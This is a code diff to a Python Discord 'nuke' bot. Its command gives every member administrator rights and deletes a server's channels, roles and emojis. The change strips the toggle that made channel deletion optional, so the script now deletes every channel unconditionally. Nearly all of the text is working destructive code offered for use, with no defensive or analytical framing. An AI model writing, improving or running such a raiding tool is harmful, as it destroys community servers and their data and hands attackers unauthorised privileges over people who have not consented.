@@ -42,7 +42,6 @@ DM_ALL_MESSAGE = "Hello"
 #     Note: Turning of guildicon will make it Bug out so leave it on
 
 giveadmin = True
-channeldel = True
 roledel = True
 emojidel = True
 guildicon = True
@@ -108,12 +107,11 @@ async def nuke(ctx):
       except:
         print(Fore.RED + "Was unable to give everyone admin" + Fore.RESET)
     for channel in guild.channels:
-      if channeldel == True:
-        try:
-          await channel.delete()
-          print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
-        except:
-          print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
+      try:
+        await channel.delete()
+        print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
+      except:
+        print(Fore.RED + f"{channel.name} was NOT deleted." + Fore.RESET)
     for role in guild.roles:
       if roledel == True:
         try:
